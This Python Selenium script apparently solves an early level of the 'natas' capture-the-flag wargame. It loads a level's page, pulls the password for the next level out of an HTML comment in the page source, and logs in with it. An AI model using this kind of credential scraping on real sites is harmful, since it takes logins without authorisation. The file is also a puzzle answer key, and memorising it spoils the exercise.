from common import *

def solve(driver, _ = None, level = 1):    # same solution for next level
    driver.get(build_url(level = level-1))
    surroundings = driver.find_element(By.XPATH, '//*[@id="content"]')
    html = surroundings.get_attribute("innerHTML")
    password = html[html.find(f"natas{level} is ")+len(f"natas{level} is "): html.find("-->")-1]

    driver.get(build_url(password=password, level = level))

    return password